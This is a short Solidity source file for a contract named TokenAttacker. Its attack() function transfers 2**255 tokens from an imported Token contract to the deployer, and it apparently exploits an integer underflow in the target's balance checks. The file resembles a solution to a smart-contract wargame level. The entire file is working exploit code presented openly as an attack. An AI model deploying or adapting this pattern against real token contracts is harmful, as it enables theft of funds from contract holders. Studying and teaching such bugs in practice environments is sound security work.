// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenAttacker {

    address owner;
    Token token;

    constructor(address _token) public {
        require(_token != address(0));
        owner = msg.sender;
        token = Token(_token);
    }

    function attack() external {
        token.transfer(owner, 2**255);
    }
}
